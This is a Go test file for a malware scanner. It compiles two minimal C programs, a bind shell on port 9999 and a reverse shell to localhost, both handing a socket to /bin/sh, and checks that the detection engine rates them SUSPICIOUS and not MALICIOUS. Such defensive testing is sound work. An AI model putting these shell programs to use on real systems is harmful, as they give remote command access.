package scanner

import (
	"os"
	"os/exec"
	"path/filepath"
	"testing"

	"aether/internal/report"
)

// These fixtures are classic Unix network-programming exercises: they contain
// the exact import combinations the behavioral engine associates with bind
// and reverse shells. Legitimate software legitimately does this (netcat,
// inetd-style helpers, self-built tools), so the verdict engine must hold
// them at SUSPICIOUS unless independent aggravation signals co-occur.
// Fixtures are compiled (never executed) at test time from standard C.

const inetdLikeSource = `
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
int main(void) {
    int s = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in a = {0};
    a.sin_family = AF_INET;
    a.sin_port = htons(9999);
    a.sin_addr.s_addr = 0;
    bind(s, (struct sockaddr *)&a, sizeof a);
    listen(s, 1);
    int c = accept(s, 0, 0);
    dup2(c, 0); dup2(c, 1); dup2(c, 2);
    char *argv[] = {"/bin/sh", 0};
    execve(argv[0], argv, 0);
    return 0;
}
`

const clientLikeSource = `
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
int main(void) {
    int s = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in a = {0};
    a.sin_family = AF_INET;
    a.sin_port = htons(9999);
    a.sin_addr.s_addr = inet_addr("127.0.0.1");
    connect(s, (struct sockaddr *)&a, sizeof a);
    dup2(s, 0); dup2(s, 1); dup2(s, 2);
    char *argv[] = {"/bin/sh", 0};
    execve(argv[0], argv, 0);
    return 0;
}
`

func buildCFixture(t *testing.T, name, source string) []byte {
	t.Helper()

	cc, err := exec.LookPath("cc")
	if err != nil {
		t.Skip("C compiler not available in test environment")
	}

	dir := t.TempDir()
	src := filepath.Join(dir, name+".c")
	if err := os.WriteFile(src, []byte(source), 0o600); err != nil {
		t.Fatalf("write source: %v", err)
	}
	bin := filepath.Join(dir, name)
	if out, err := exec.Command(cc, "-O2", "-o", bin, src).CombinedOutput(); err != nil {
		t.Skipf("cc failed in test environment: %v: %s", err, out)
	}
	data, err := os.ReadFile(bin)
	if err != nil {
		t.Fatalf("read built fixture: %v", err)
	}
	return data
}

// TestBenignCompiledTools_SingleSignalStaysSuspicious is the regression lock
// for the highest-impact false-positive class: an unowned, self-built network
// tool whose imports match a shell combo must adjudicate SUSPICIOUS, never
// MALICIOUS, without independent aggravation signals.
func TestBenignCompiledTools_SingleSignalStaysSuspicious(t *testing.T) {
	cases := []struct {
		name     string
		source   string
		expRule  string
		homePath string
	}{
		{"inetd_like", inetdLikeSource, "ELF_Behavioral_C2_Listener_Combo", "/home/dev/.local/bin/mini-inetd"},
		{"client_like", clientLikeSource, "ELF_Behavioral_ReverseShell_Combo", "/home/dev/.local/bin/nc-clone"},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			data := buildCFixture(t, tc.name, tc.source)
			matches := AnalyzeELFExecutable(tc.homePath, data, 0o755, nil, nil)

			var combo *HeuristicMatch
			for i := range matches {
				if matches[i].Name == tc.expRule {
					combo = matches[i]
				}
			}
			if combo == nil {
				t.Fatalf("expected %s to fire on fixture, got: %v", tc.expRule, matchNames(matches))
			}

			f := report.NewFinding("filesystem", combo.Severity, tc.homePath, combo.Reason, combo.Name)
			verdict := report.DetermineVerdict(&f, nil, true, false, false, combo.Corroboration)
			if verdict == report.VerdictMalicious {
				t.Errorf("FALSE POSITIVE: benign self-built network tool adjudicated MALICIOUS (corroboration: %v)", combo.Corroboration)
			}
			if verdict != report.VerdictSuspicious {
				t.Errorf("expected SUSPICIOUS for uncorroborated combo, got %v", verdict)
			}
		})
	}
}

func matchNames(matches []*HeuristicMatch) []string {
	names := make([]string, 0, len(matches))
	for _, m := range matches {
		names = append(names, m.Name)
	}
	return names
}
